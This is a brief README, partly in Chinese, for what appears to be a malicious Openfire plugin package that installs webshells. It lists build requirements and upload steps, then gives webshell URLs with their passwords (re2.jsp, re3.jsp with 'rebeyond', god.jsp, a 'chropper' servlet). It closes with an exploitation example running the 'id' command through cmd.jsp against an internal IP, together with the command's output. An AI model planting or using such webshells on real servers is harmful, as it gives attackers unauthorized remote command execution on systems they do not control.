# build requirements:
ant1.9
jdk1.6

上传 openfire_shells/src/plugins/test/bin 下的test.jar后


```
usages:

/plugins/test/re2.jsp pass
/plugins/re3.jsp rebeyond
/plugins/god.jsp pass

/plugins/servlet/chropper?
/plugins/servlet/test?
```

漏洞利用：

0x01 执行系统命令

`http://10.20.31.189:9090/plugins/test/cmd.jsp?pwd=023&i=id

```
uid=102(openfire) gid=105(openfire) groups=105(openfire)

```
